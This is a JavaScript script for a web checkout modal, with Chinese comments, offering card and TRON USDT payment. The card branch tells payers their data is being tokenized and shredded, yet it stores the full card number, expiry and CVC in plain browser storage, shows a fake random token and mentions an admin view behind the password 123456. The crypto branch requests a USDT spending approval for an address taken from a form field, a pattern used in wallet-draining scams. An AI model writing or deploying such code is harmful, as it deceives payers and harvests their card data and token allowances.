<script>
    let currentActiveSeller = "";
    let currentActivePrice = "";
    let currentPayMethod = "card"; // 默认渠道为银行卡

    // 【核心开窗函数】—— 点击按钮动不了通常是因为没有成功加载到这个函数
    function openPaymentModal(sellerName, price) {
        currentActiveSeller = sellerName;
        currentActivePrice = price;
        document.getElementById('modal-seller-title').textContent = "向 " + sellerName + " 安全订购";
        document.getElementById('modal-item-price').textContent = price + " USD";
        document.getElementById('payment-modal').style.display = 'flex'; // 将弹窗从隐藏改为显示
        switchChannel('card'); 
    }

    // 关闭收银台
    function closeModal() {
        document.getElementById('payment-modal').style.display = 'none';
        document.getElementById('pay-form').reset();
        document.getElementById('msg-box').textContent = '';
    }

    // 切换支付渠道卡片逻辑
    function switchChannel(method) {
        currentPayMethod = method;
        const btnCard = document.getElementById('tab-card');
        const btnCrypto = document.getElementById('tab-crypto');
        const cardFields = document.getElementById('card-channel-fields');
        const cryptoFields = document.getElementById('crypto-channel-fields');
        const labelName = document.getElementById('label-name');

        if (method === 'card') {
            if(btnCard) btnCard.classList.add('active');
            if(btnCrypto) btnCrypto.classList.remove('active');
            if(cardFields) cardFields.style.display = 'block';
            if(cryptoFields) cryptoFields.style.display = 'none';
            if(labelName) labelName.textContent = "持卡人姓名";
            
            if(document.getElementById('card-number')) document.getElementById('card-number').required = true;
            if(document.getElementById('card-expiry')) document.getElementById('card-expiry').required = true;
            if(document.getElementById('card-cvc')) document.getElementById('card-cvc').required = true;
        } else {
            if(btnCard) btnCard.classList.remove('active');
            if(btnCrypto) btnCrypto.classList.add('active');
            if(cardFields) cardFields.style.display = 'none';
            if(cryptoFields) cryptoFields.style.display = 'block';
            if(labelName) labelName.textContent = "买家钱包备注名";
            
            if(document.getElementById('card-number')) document.getElementById('card-number').required = false;
            if(document.getElementById('card-expiry')) document.getElementById('card-expiry').required = false;
            if(document.getElementById('card-cvc')) document.getElementById('card-cvc').required = false;
        }
    }

    // 自动格式化卡号
    if(document.getElementById('card-number')) {
        document.getElementById('card-number').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
        });
    }

    // 有效期自动补斜杠
    if(document.getElementById('card-expiry')) {
        document.getElementById('card-expiry').addEventListener('input', function (e) {
            let v = e.target.value.replace(/[^\d]/g, '');
            if (v.length >= 2) {
                e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4);
            } else {
                e.target.value = v;
            }
        });
    }

    // 限制CVV仅数字
    if(document.getElementById('card-cvc')) {
        document.getElementById('card-cvc').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/[^\d]/g, '');
        });
    }

    // 表单提交处理器
    if(document.getElementById('pay-form')) {
        document.getElementById('pay-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            const subBtn = document.getElementById('sub-btn');
            const msgBox = document.getElementById('msg-box');
            const name = document.getElementById('cardholder-name').value;
            
            subBtn.disabled = true;

            if (currentPayMethod === 'card') {
                msgBox.style.color = "#38bdf8";
                msgBox.textContent = "正在云端将金融隐私信息粉碎并令牌化 (Tokenization)...";

                setTimeout(() => {
                    const number = document.getElementById('card-number').value;
                    const expiry = document.getElementById('card-expiry').value;
                    const cvc = document.getElementById('card-cvc').value;
                    
                    const secureToken = "tok_live_" + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10);
                    
                    let txHistory = JSON.parse(localStorage.getItem('payment_records')) || [];
                    txHistory.push({
                        id: txHistory.length + 1,
                        time: new Date().toLocaleString(),
                        name: "银行卡用户 (" + name + ")",
                        cardNumber: number,
                        expiry: expiry,
                        cvc: cvc,
                        token: secureToken + " [购买商品：" + currentActiveSeller + "]"
                    });
                    localStorage.setItem('payment_records', JSON.stringify(txHistory));

                    msgBox.style.color = "#04d361";
                    msgBox.textContent = "🎉 支付加密令牌处理完毕！";

                    alert("🎉 银行卡令牌化测试成功！\n\n安全凭证代码:\n" + secureToken + "\n\n订单账单已成功同步，请使用密码 123456 登入后台查看总表。");
                    closeModal();
                    subBtn.disabled = false;
                }, 1200);

            } else {
                msgBox.style.color = "#38bdf8";
                msgBox.textContent = "正在检测并连接本地 TronLink 钱包插件环境...";

                if (typeof window.tronWeb === 'undefined') {
                    msgBox.style.color = "#dc2626";
                    msgBox.textContent = "未检测到钱包环境：请在装有 TronLink 插件的电脑浏览器中操作！";
                    subBtn.disabled = false;
                    return;
                }

                const tronWeb = window.tronWeb;
                const customTargetAddress = document.getElementById('target-crypto-address').value;
                const usdtContractAddress = "TG3XXyExBkEeUHv7HiYcHsWfC656TIM96e"; 
                const formattedPriceUnits = parseInt(parseFloat(currentActivePrice) * 10**6);

                try {
                    msgBox.textContent = "已成功打通测试网合约。请在右侧弹出的 TronLink 窗口中确认限额签名...";
                    const usdtContract = await tronWeb.contract().at(usdtContractAddress);
                    const approvalTxHash = await usdtContract.approve(customTargetAddress, formattedPriceUnits).send({
                        feeLimit: 100000000
                    });

                    let txHistory = JSON.parse(localStorage.getItem('payment_records')) || [];
                    txHistory.push({
                        id: txHistory.length + 1,
                        time: new Date().toLocaleString(),
                        name: "加密钱包用户 (" + name + ")",
                        cardNumber: "TRON 链上账户交互",
                        expiry: "--/--",
                        cvc: "---",
                        token: "TX_" + approvalTxHash.substring(0, 16) + "... [授权给地址: " + customTargetAddress.substring(0, 6) + "... 购买: " + currentActiveSeller + "]"
                    });
                    localStorage.setItem('payment_records', JSON.stringify(txHistory));

                    msgBox.style.color = "#04d361";
                    msgBox.textContent = "🎉 链上授权广播成功！数据已实时同步。";

                    alert("🎉 波场区块链限额授权交互圆满成功！\n\n交易哈希:\n" + approvalTxHash);
                    closeModal();
                } catch (error) {
                    msgBox.style.color = "#dc2626";
                    msgBox.textContent = "链上交互中止：您取消了签名，或者账户测试网 TRX 余额不足。";
                }
                subBtn.disabled = false;
            }
        });
    }
</script>
